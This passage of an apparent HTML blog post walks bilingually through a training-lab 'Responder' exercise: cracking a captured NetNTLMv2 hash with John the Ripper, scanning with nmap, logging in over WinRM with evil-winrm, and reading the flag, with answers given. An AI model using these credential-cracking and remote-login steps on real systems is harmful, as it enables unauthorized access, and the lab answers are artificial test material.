+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 10.129.90.34
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : RESPONDER<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : Administrator::RESPONDER:1a9b74e7cb5cea88:529BBCE014913781D92863C829E822B7:01010000000000000098BA4EED69DD01CED011A1149549530000000002000800460042004A00490001001E00570049004E002D00370049004D004D00490050005900370047004300320004003400570049004E002D00370049004D004D0049005000590037004700430032002E00460042004A0049002E004C004F00430041004C0003001400460042004A0049002E004C004F00430041004C0005001400460042004A0049002E004C004F00430041004C00070008000098BA4EED69DD010600040002000000080030003000000000000000010000000020000099CA4CCA78D467625073E7CCB60FA6B36B27FEED1DA573D43B2A468D7382B97B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100300032000000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：-I</strong></p>
+<h3 id="task-8">Task 8
+</h3><blockquote>
+<p>There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code>john</code>, but the full name is what?.</p>
+<p>有一些工具会接收 NetNTLMv2 质询/响应，并尝试数百万个密码，以查看是否有任何密码会生成相同的响应。其中一款工具通常被称为 John，但它的全名是什么？</p>
+</blockquote>
+<p><strong>答案：John the Ripper</strong></p>
+<h3 id="task-9">Task 9
+</h3><blockquote>
+<p>What is the password for the administrator user?</p>
+<p>管理员用户的密码是什么？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# vim hash.txt                                     
+</span></span><span class="line"><span class="cl">                                                                                      
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# cat hash.txt                                     
+</span></span><span class="line"><span class="cl">Administrator::RESPONDER:1a9b74e7cb5cea88:529BBCE014913781D92863C829E822B7:01010000000000000098BA4EED69DD01CED011A1149549530000000002000800460042004A00490001001E00570049004E002D00370049004D004D00490050005900370047004300320004003400570049004E002D00370049004D004D0049005000590037004700430032002E00460042004A0049002E004C004F00430041004C0003001400460042004A0049002E004C004F00430041004C0005001400460042004A0049002E004C004F00430041004C00070008000098BA4EED69DD010600040002000000080030003000000000000000010000000020000099CA4CCA78D467625073E7CCB60FA6B36B27FEED1DA573D43B2A468D7382B97B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100300032000000000000000000
+</span></span><span class="line"><span class="cl">                                                                                      
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# john -w<span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt 
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Will run <span class="m">4</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">badminton        <span class="o">(</span>Administrator<span class="o">)</span>     
+</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE <span class="o">(</span>2026-11-01 10:44<span class="o">)</span> 25.00g/s 102400p/s 102400c/s 102400C/s slimshady..oooooo
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed. 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：badminton</strong></p>
+<h3 id="task-10">Task 10
+</h3><blockquote>
+<p>We&rsquo;ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</p>
+<p>我们将使用 Windows 服务（即在目标主机上运行的服务）通过我们找回的密码远程访问响应服务器。它监听的是哪个 TCP 端口？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn 10.129.90.34                            
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-01 10:45 -0500
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.90.34 <span class="o">(</span>10.129.90.34<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.27s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">80/tcp   open  http
+</span></span><span class="line"><span class="cl">5985/tcp open  wsman
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 21.59 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>5985 = WinRM（WS-Management，wsman）。HTTP 明文 WinRM。</p>
+<p>WinRM 是微软实现的 <strong>WS-Management 协议</strong>，用来做 Windows 远程管理，最核心用途：<strong>PowerShell 远程（PSRemoting）</strong>，远程在目标机器上执行 powershell 命令、拿 shell、读取系统信息。 支持 NTLM、Kerberos 认证，默认只允许管理员账号登录。</p>
+<p><strong>答案：5985</strong></p>
+<h3 id="task-11">Task 11
+</h3><blockquote>
+<p>On which user&rsquo;s desktop is the flag located?</p>
+<p>flag 位于哪个用户的桌面上？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# evil-winrm -i 10.129.90.34 -u Administrator -p badminton
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.9
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="sb">`</span>quoting_detection_proc<span class="err">&#39;</span> <span class="k">for</span> module Reline
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; whoami
+</span></span><span class="line"><span class="cl">responder<span class="se">\a</span>dministrator
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; net user
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User accounts <span class="k">for</span> <span class="se">\\</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">Administrator            DefaultAccount           Guest
+</span></span><span class="line"><span class="cl">mike                     WDAGUtilityAccount
+</span></span><span class="line"><span class="cl">The <span class="nb">command</span> completed with one or more errors.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>evil-winrm</code> 可以直接通过账号密码拿到交互式 Shell（默认 PowerShell）。</p>
+<p><code>net user</code> 列出本机所有用户。其中 <code>Administrator</code> 是管理员用户，<code>DefaultAccount / Guest / WDAGUtilityAccount</code> 是系统内置默认账号，所以 <code>mike</code> 大概率是突破点。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> C:<span class="se">\U</span>sers<span class="se">\m</span>ike
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike&gt; dir
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ike
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
+</span></span><span class="line"><span class="cl">d-----         3/10/2022   4:51 AM                Desktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike&gt; <span class="nb">cd</span> .<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike<span class="se">\D</span>esktop&gt; dir
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ike<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
+</span></span><span class="line"><span class="cl">-a----         3/10/2022   4:50 AM             <span class="m">32</span> flag.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike<span class="se">\D</span>esktop&gt; cat flag.txt
+</span></span><span class="line"><span class="cl">ea81b7afddd03efaa0945333ed147fac
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：mike</strong></p>
+<h3 id="submit-single-flag">Submit Single Flag
+</h3><blockquote>
+<p>Submit the flag located on the mike user&rsquo;s desktop.</p>
+<p>提交位于 mike 用户桌面上的 flag。</p>
+</blockquote>
+<p><strong>答案：ea81b7afddd03efaa0945333ed147fac</strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/7.-sequel/">
+        
+        
+            <div class="article-image">
+                <img src="/p/7.-sequel/assets/image-20261101130244314.37a58b82e3cabb2a657b1ccb34a1f05c_hu4581008664241020563.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 7. Sequel"
+                        
+                        data-hash="md5-N6WLguPKuyplexzLNKHwXA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">7. Sequel</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/6.-crocodile/">
+        
+        
+            <div class="article-image">
+                <img src="/p/6.-crocodile/assets/image-20261031140058728.272f97f7b0e4493b02bcd42992dd1af0_hu12831942009832207756.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 6. Crocodile"
+                        
+                        data-hash="md5-Jy&#43;X97DkSTsCvNQpkt0a8A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">6. Crocodile</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/5.-appointment/">
+        
+        
+            <div class="article-image">
+                <img src="/p/5.-appointment/assets/image-20261030160424813.0eddbeb4be2b73e075784b4cba66f77b_hu6714861272316513708.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 5. Appointment"
+                        
+                        data-hash="md5-Dt2&#43;tL4rc&#43;B1eEtMumb3ew==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">5. Appointment</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Sp1ke
+    </section>
+    
+    <section class="powerby">
+        
+            记录安全学习 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
